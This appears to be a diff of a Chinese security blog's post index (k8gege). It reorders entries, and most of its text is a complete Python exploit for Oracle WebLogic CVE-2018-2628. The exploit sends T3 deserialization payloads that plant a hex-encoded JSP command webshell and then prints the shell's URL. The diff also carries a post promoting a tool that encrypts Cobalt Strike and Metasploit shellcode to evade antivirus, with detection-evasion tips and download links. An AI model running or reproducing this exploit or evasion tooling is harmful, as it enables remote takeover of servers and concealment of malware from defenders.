= ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
+<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
+<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
+<pre><code>rs=send_payload_objdata(sock, payload)
+#print(&apos;response: &apos; + rs)
+print(&apos;exploit completed!&apos;)
+print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
+print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
+<pre><code>dip = sys.argv[1]
+dport = int(sys.argv[2])
+exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
+</div>
+<h2>&nbsp;演示:</h2>
+<p><img alt data-original="http://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
+<h2>附件说明:</h2>
+<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>Weblogic</tag>
+        <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -3106,57 +3155,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       <tags>
         <tag>Exp</tag>
         <tag>Tool</tag>
+        <tag>GetShell</tag>
         <tag>Code</tag>
-        <tag>GetShell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
-    <url>/p/b8e58f69.html</url>
-    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
-<hr>
-<ul>
-<li>漏洞威胁：RCE--远程代码执行</li>
-<li>漏洞组件：weblogic</li>
-<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
-</ul>
-<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
-# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
-
-<p>from <strong>future</strong> import print_function</p>
-<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
-<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
-<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
-return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
-<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
-<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
-<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
-<pre><code>rs=send_payload_objdata(sock, payload)
-#print(&apos;response: &apos; + rs)
-print(&apos;exploit completed!&apos;)
-print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
-print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
-<pre><code>dip = sys.argv[1]
-dport = int(sys.argv[2])
-exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
-</div>
-<h2>&nbsp;演示:</h2>
-<p><img alt data-original="http://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
-<h2>附件说明:</h2>
-<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
-<p>&nbsp;</p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>GetShell</tag>
-        <tag>Weblogic</tag>
       </tags>
   </entry>
   <entry>
@@ -3250,6 +3250,35 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
+    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
+    <url>/p/9cffe32c.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
+<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
+<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
+<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
+<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
+<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
+<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
+<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
+<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
+<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>免杀</category>
+        <category>Metasploit</category>
+        <category>Cobalt Strike</category>
+        <category>ShellCode</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>K8 Struts2 EXP 综合漏洞利用工具</title>
     <url>/p/ab3e87f7.html</url>
     <content><![CDATA[<p>工具:&nbsp;K8&nbsp;Struts2&nbsp;Exploit<br>组织:&nbsp;K8搞基大队[K8team]<br>作者:&nbsp;K8拉登哥哥<br>博客:&nbsp;<a href="http://qqhack8.blog.163.com" target="_blank">http://qqhack8.blog.163.com</a><br>发布:&nbsp;2014/7/31&nbsp;10:24:56<br><br>简介: <br><br>K8 Struts2 综合漏洞利用工具 (Apache Struts Remote Code Execution Exploit)<br>Struts2漏洞检测工具&nbsp;&nbsp; Struts2漏洞测试工具&nbsp; K8 struts2 exploit Test&nbsp; Struts2 GetShell<br>支持漏洞 (S2-045 devMode S2-032&nbsp; s2-020&nbsp; s2-019&nbsp; s2-016&nbsp; s2-013&nbsp; s2-009 S2-005)&nbsp; <br><br>声明:工具仅供安全检测或网络攻防研究,非法用途后果自负.<br>图片: <br><img alt data-original="http://k8gege.org/k8img/posts/S2exp1.png"></p>
@@ -3294,35 +3323,6 @@ Microsoft Windows 10 for 32-bit Systems 0
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
-    <url>/p/9cffe32c.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
-<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
-<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
-<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
-<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
-<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
-<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
-<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
-<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
-<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-        <category>免杀</category>
-        <category>Metasploit</category>
-        <category>ShellCode</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -3410,9 +3410,9 @@ Microsoft Windows 10 for 32-bit Systems 0
       <categories>
         <category>工具</category>
         <category>Ladon</category>
+        <category>Python</category>
         <category>源码</category>
         <category>编程</category>
-        <category>Python</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -3561,9 +3561,9 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
       <categories>
         <category>工具</category>
-        <category>Cobalt Strike</category>
         <category>免杀</category>
         <category>Metasploit</category>
+        <category>Cobalt Strike</category>
         <category>ShellCode</category>
         <category>Python</category>
       </categories>
@@ -3895,13 +3895,13 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
+        <category>Python</category>
+        <category>内网渗透</category>
         <category>源码</category>
         <category>主机发现</category>
-        <category>内网渗透</category>
-        <category>编程</category>
-        <category>Python</category>
-        <category>信息收集</category>
         <category>嗅探</category>
+        <category>信息收集</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Tool</tag>
